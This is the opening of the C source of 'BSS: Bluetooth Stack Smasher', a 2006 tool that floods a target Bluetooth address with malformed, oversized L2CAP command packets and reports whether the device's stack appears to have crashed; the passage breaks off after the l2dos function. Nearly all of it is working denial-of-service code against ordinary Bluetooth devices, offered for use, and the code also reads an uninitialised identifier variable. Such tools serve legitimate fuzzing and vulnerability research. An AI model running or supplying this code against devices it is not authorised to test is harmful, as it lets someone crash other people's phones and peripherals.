/* 
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *, int, int);
char *code2define(int);

void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
{
    char *buf;
    l2cap_cmd_hdr *cmd;    /* struct detailed in /usr/include/bluetooth/l2cap.h */
    struct sockaddr_l2 addr;
    int sock, i, id;
    char *strcode = NULL;
    
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(bdstr_addr, &addr.l2_bdaddr);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    if (!(buf = (char *)malloc((int)siz))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    for (i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
    {
        if (pad == 0)
            buf[i] = 0x41; /* Default padding byte */
        else
            buf[i] = pad;
    }

    fprintf(stdout, "size = %d\n", siz);
    strcode = code2define(cmdnum);
    if (strcode == NULL)
    {
        perror("L2CAP command unknown");
        exit(EXIT_FAILURE);
    }
    else
        fprintf(stdout, "Performing \"%s\" fuzzing...\n", strcode);

    for (i = 0; i < IT; i++)
    {                   // Send IT times the packet thru the air
        cmd = (l2cap_cmd_hdr *)buf;
        cmd->code = cmdnum;
        cmd->ident = (i % 250) + 1; /* Identificator */
        cmd->len = __cpu_to_le16(LENGTH);

        putchar('.');
        fflush(stdout);

        if (send(sock, buf, siz ? siz : MAXSIZE, 0) <= 0)
        {
            fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
            fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
            fprintf(stdout, "\t ----------------------------------------------------\n");
            fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
            fprintf(stdout, "\t Code field\t%s\n", strcode);
            fprintf(stdout, "\t Ident field\t%d\n", id);
            fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
            fprintf(stdout, "\t Packet size\t%d\n", siz);
            fprintf(stdout, "\t ----------------------------------------------------\n");
        }
        if (++id > 254)
            id = 1;
    }

    free(strcode);    
}

...

